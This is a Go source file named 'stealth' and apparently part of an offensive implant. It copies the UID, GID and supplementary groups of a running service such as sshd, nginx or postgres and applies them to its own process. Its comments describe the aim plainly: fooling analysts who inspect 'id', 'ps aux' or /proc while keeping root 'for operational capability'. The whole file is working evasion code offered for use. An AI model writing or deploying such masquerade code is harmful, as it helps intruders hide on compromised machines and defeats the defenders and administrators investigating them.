package stealth

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
)

// GroupProfile represents the UID/GID identity of a target process.
type GroupProfile struct {
	UID               int
	GID               int
	SupplementaryGIDs []int
	Username          string
}

// CaptureGroupProfile reads the full UID/GID/groups identity of a target process.
// Reads from /proc/[pid]/status for UID/GID and supplementary groups.
func CaptureGroupProfile(pid int) (*GroupProfile, error) {
	f, err := os.Open(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return nil, err
	}
	defer f.Close()

	profile := &GroupProfile{}
	scanner := bufio.NewScanner(f)

	for scanner.Scan() {
		line := scanner.Text()

		if strings.HasPrefix(line, "Uid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				profile.UID, _ = strconv.Atoi(fields[1]) // real UID
			}
		}

		if strings.HasPrefix(line, "Gid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				profile.GID, _ = strconv.Atoi(fields[1]) // real GID
			}
		}

		if strings.HasPrefix(line, "Groups:") {
			fields := strings.Fields(line)
			for _, g := range fields[1:] {
				gid, err := strconv.Atoi(g)
				if err == nil {
					profile.SupplementaryGIDs = append(profile.SupplementaryGIDs, gid)
				}
			}
		}
	}

	// Resolve username from /etc/passwd
	profile.Username = resolveUsername(profile.UID)

	return profile, nil
}

// CaptureGroupProfileByName finds a process by name and captures its group profile.
func CaptureGroupProfileByName(processName string) (*GroupProfile, error) {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, err
	}

	for _, entry := range entries {
		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid <= 2 {
			continue
		}

		comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err != nil {
			continue
		}

		if strings.TrimSpace(string(comm)) == processName {
			return CaptureGroupProfile(pid)
		}
	}

	return nil, fmt.Errorf("process %s not found", processName)
}

// ApplyGroupProfile changes our process identity to match the target.
// This sets real, effective, and saved UIDs/GIDs plus supplementary groups.
//
// OPSEC: Run this AFTER namespace setup but BEFORE any operational work.
// Analysts checking `id`, `ps aux`, or /proc/[pid]/status will see
// the expected user/group for the masqueraded process.
//
// WARNING: If dropping from root to non-root, you lose root privileges.
// Call this only if you're okay running unprivileged, or pair with
// ambient capabilities (capabilities.go) to retain needed caps.
func ApplyGroupProfile(profile *GroupProfile, dropToUser bool) error {
	// Set supplementary groups first (requires root)
	if len(profile.SupplementaryGIDs) > 0 {
		if err := syscall.Setgroups(profile.SupplementaryGIDs); err != nil {
			return fmt.Errorf("setgroups: %w", err)
		}
	}

	if !dropToUser {
		// Only set groups, keep root UID/GID for operational capability
		return nil
	}

	// Set GID before UID (setting UID drops privilege to change GID)
	if err := syscall.Setresgid(profile.GID, profile.GID, profile.GID); err != nil {
		return fmt.Errorf("setresgid: %w", err)
	}

	if err := syscall.Setresuid(profile.UID, profile.UID, profile.UID); err != nil {
		return fmt.Errorf("setresuid: %w", err)
	}

	return nil
}

// BlendGroups is the all-in-one: find target process, capture its groups, apply them.
// Only sets supplementary groups by default (safe — doesn't drop root).
func BlendGroups(processName string) error {
	profile, err := CaptureGroupProfileByName(processName)
	if err != nil {
		return applyGenericGroups(processName)
	}

	return ApplyGroupProfile(profile, false)
}

// applyGenericGroups sets supplementary groups typical of common services.
func applyGenericGroups(processName string) error {
	var groups []int

	switch processName {
	case "sshd":
		// sshd typically runs as root with no supplementary groups
		groups = []int{}
	case "nginx", "apache2":
		// www-data group (33 on Debian/Ubuntu)
		groups = []int{33}
	case "systemd-resolved", "systemd-networkd":
		// systemd-network (101), systemd-resolve (102) on typical systems
		groups = []int{101, 102}
	case "postgres":
		groups = []int{115} // postgres group
	case "mysql", "mysqld":
		groups = []int{116} // mysql group
	default:
		// Generic daemon groups: daemon(1), adm(4), syslog(108)
		groups = []int{1, 4}
	}

	return syscall.Setgroups(groups)
}

// resolveUsername looks up a username from UID via /etc/passwd.
func resolveUsername(uid int) string {
	f, err := os.Open("/etc/passwd")
	if err != nil {
		return ""
	}
	defer f.Close()

	uidStr := strconv.Itoa(uid)
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		fields := strings.SplitN(scanner.Text(), ":", 4)
		if len(fields) >= 3 && fields[2] == uidStr {
			return fields[0]
		}
	}
	return ""
}

// VerifyGroupBlend checks if our current groups match the target profile.
func VerifyGroupBlend(target *GroupProfile) []string {
	var issues []string

	// Check supplementary groups
	currentGroups, err := syscall.Getgroups()
	if err != nil {
		issues = append(issues, "cannot read current groups")
		return issues
	}

	targetSet := make(map[int]bool)
	for _, g := range target.SupplementaryGIDs {
		targetSet[g] = true
	}

	currentSet := make(map[int]bool)
	for _, g := range currentGroups {
		currentSet[g] = true
	}

	for g := range targetSet {
		if !currentSet[g] {
			issues = append(issues, fmt.Sprintf("missing group %d", g))
		}
	}

	for g := range currentSet {
		if !targetSet[g] {
			issues = append(issues, fmt.Sprintf("extra group %d", g))
		}
	}

	return issues
}
